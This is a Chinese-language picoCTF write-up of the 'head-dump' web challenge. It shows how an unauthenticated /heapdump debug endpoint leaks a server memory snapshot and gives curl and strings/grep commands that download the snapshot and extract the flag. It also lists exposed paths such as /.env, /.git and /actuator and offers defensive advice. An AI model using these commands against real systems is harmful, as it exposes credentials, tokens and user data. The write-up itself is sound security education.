## Challenge Metadata

- **Platform:** picoCTF
- **Category:** Web Exploitation
- **Difficulty:** Easy
- **Author:** Bryan
- **Date:** 2026-02-19

## 一、基本資訊

**題目名稱：** head-dump  
**題目類型：** Web Exploitation / Misconfiguration  
**平台：** picoCTF 2025  
**目標：** 找出暴露的除錯端點，並從伺服器記憶體傾印檔中取得隱藏的 flag

## 二、題目概述

本題提供一個部落格型網站，表面上可瀏覽文章內容，並包含一篇與 API Documentation 有關的文章。題目提示指出，網站中存在一個可生成伺服器記憶體傾印檔案的端點，而 flag 就隱藏在該檔案中。

本題的核心不在於傳統的輸入型漏洞，而是在於：

- 網站暴露了不應公開的除錯功能
- 該功能可直接下載伺服器的 heap snapshot / heap dump
- 下載後可從傾印檔中擷取敏感資訊與 flag

此類問題在真實環境中屬於典型的 敏感除錯端點暴露（Debug Artifact Exposure） 或 記憶體資料洩漏（Memory Disclosure）。

## 三、分析目標

本次分析的主要目標如下：

- 確認網站是否存在可疑的除錯或 debug 類型端點
- 驗證該端點是否可直接下載伺服器 heap dump
- 從 heap dump 中擷取 flag
- 說明此弱點的成因與風險
- 提出防禦建議

## 四、前期觀察

題目敘述指出網站中有一篇與 API Documentation 有關的文章，因此可推測：

- 網站可能存在 Swagger / OpenAPI / API Docs
- 開發人員可能在部署時遺留除錯或內部管理端點
- 題目所謂的「memory dump file」通常會出現在像 /heapdump、/dump、/snapshot 等路徑

因此，解題方向應以：

- API 文件線索
- 常見除錯端點枚舉
- 下載二進位傾印檔並分析內容

作為主軸。

## 五、弱點判定

### 5.1 弱點描述

經實際測試可確認網站存在以下端點：

/heapdump

對此端點發送請求後，伺服器會回傳：

HTTP 200 OK

Content-Type: application/octet-stream

Content-Disposition: attachment; filename="heapdump-xxxxxxxxxxxx.heapsnapshot"

這代表該端點會直接提供一份 heap snapshot / heap dump 供下載，而不需要額外授權或身分驗證。

此行為屬於不安全的除錯端點暴露。由於 heap dump 會包含應用程式執行時留存在記憶體中的資料，因此極可能洩漏：

- token
- session 資訊
- API key
- 使用者資料
- internal object
- 旗標或敏感字串

### 5.2 弱點類型

- Debug Endpoint Exposure
- Memory Disclosure
- Sensitive Information Exposure
- Insecure Production Configuration

### 5.3 風險說明

若真實系統對外公開 heap dump 端點，攻擊者可直接下載伺服器記憶體快照，從中搜尋：

- 認證資訊
- 密碼或 token
- 私密設定值
- 暫存資料
- 內部程式物件內容

在本題中，flag 即被直接保存在 heap dump 中，因此攻擊者無須繞過額外控制機制，只需下載檔案後進行字串搜尋即可取得敏感資訊。

## 六、攻擊思路

本題的利用邏輯如下：

- 透過題目敘述與網站內容推測存在 API / debug 線索
- 嘗試常見 heap dump 相關端點
- 發現 /heapdump 會直接回傳記憶體傾印檔
- 將該檔案下載到本地
- 使用 strings 或 grep 從傾印檔中搜尋 picoCTF{...} 格式字串
- 成功取得 flag

這種攻擊方式本質上不是「破解」記憶體內容，而是利用錯誤暴露的內部除錯資源進行被動擷取。

## 七、利用過程

### 7.1 驗證 heapdump 端點是否存在

先確認 /heapdump 是否可存取：

```sh
curl -I http://verbal-sleep.picoctf.net:PORT/heapdump
```

若端點存在，通常可看到類似回應：

HTTP/1.1 200 OK
Content-Disposition: attachment; filename="heapdump-xxxxxxxxxxxx.heapsnapshot"
Content-Type: application/octet-stream

這代表該路徑可直接下載 heap dump。

### 7.2 下載 heap dump

```sh
curl -sS http://verbal-sleep.picoctf.net:PORT/heapdump -o heapdump
```

下載後可確認檔案大小：

```sh
ls -lh heapdump
```

在本題中，heap dump 檔案大小約為 10MB 左右。

### 7.3 從 heap dump 中搜尋 flag

使用字串分析方式搜尋符合 picoCTF 格式的內容：

```sh
strings -a heapdump | grep -oE 'picoCTF\{[^}]+\}'
```

### 7.4 成功擷取 flag

執行後即可得到flag

## 八、利用結果

成功從公開的 heap dump 檔案中取得 flag


## 九、完整 exploit 指令

```sh
curl -I http://verbal-sleep.picoctf.net:PORT/heapdump

curl -sS http://verbal-sleep.picoctf.net:PORT/heapdump -o heapdump

strings -a heapdump | grep -oE 'picoCTF\{[^}]+\}'
```

若要一行完成，可使用：

```sh
curl -sS http://verbal-sleep.picoctf.net:PORT/heapdump -o heapdump && \
strings -a heapdump | grep -oE 'picoCTF\{[^}]+\}'
```

## 十、成因分析

本題弱點產生的主要原因，在於開發或部署階段錯誤地將內部除錯功能公開至外部環境。

問題點如下：

- 將 heap dump / heapsnapshot 類端點暴露在對外服務中
- 此類端點原本應僅供開發或內部診斷使用，不應在 production 對外開放。
- 缺乏存取控制
- /heapdump 不需要登入、不需要 token、也沒有 IP 限制，導致任何人都可直接下載。
- 記憶體中保存敏感資料
- 應用程式執行期間，敏感資訊留存在 heap 中，而 dump 功能會完整保留這些內容。
- 缺乏最小化暴露原則
- 對外網站除提供正常業務功能外，還暴露了額外的內部診斷能力，增加了攻擊面。

## 十一、防禦建議

為避免此類問題，可採取以下措施：

### 11.1 關閉 production 環境中的 debug / dump 端點

像 /heapdump、/dump、/snapshot、/actuator/heapdump 這類路徑，不應直接對外公開。

### 11.2 加入嚴格的存取控制

若確實需要保留診斷能力，至少應加入：

- 身分驗證
- 權限控管
- 管理網段限制
- VPN / bastion host 存取限制

### 11.3 將除錯功能與正式業務功能分離

內部診斷端點應部署於獨立管理介面，而非與公開網站共用同一個入口。

### 11.4 減少敏感資料在記憶體中的暴露時間

避免長時間將 token、secret、flag 類敏感資料保留在記憶體物件中，降低 dump 後可直接擷取的風險。

### 11.5 安全檢查與部署前掃描

在部署前應使用自動化工具檢查常見敏感暴露路徑，例如：

- /heapdump
- /actuator
- /.env
- /.git
- /swagger
- /openapi.json

## 十二、結論

本題表面上是尋找網站中隱藏端點的 Web 題，但其真正考點在於生產環境中錯誤暴露的除錯功能。透過觀察網站內容與 API documentation 線索，可推測伺服器可能存在內部診斷端點。進一步測試後確認 /heapdump 可直接下載 heap snapshot，而該檔案中又包含敏感字串，因此攻擊者可透過單純的字串搜尋直接取得 flag。

此案例反映了真實世界中一種非常危險的配置錯誤：除錯功能在 production 被對外暴露，導致敏感資料被動洩漏。一旦攻擊者能取得 heap dump，後果不僅限於單一旗標，而可能擴大為認證資料、使用者隱私與內部系統資訊的全面暴露。

## 十三、附錄：關鍵觀念整理

| 項目 | 說明 |
|---|---|
| 弱點名稱 | Heap Dump Exposure |
| 弱點類型 | Sensitive Information Exposure |
| 利用條件 | 對外可存取 /heapdump 類型除錯端點 |
| 利用方式 | 下載 heap dump 後進行字串搜尋 |
| 攻擊效果 | 洩漏記憶體中的敏感資料 |
| 本題成果 | 成功從 heap dump 中取得 picoCTF flag |

## 使用工具

- curl
- strings
- grep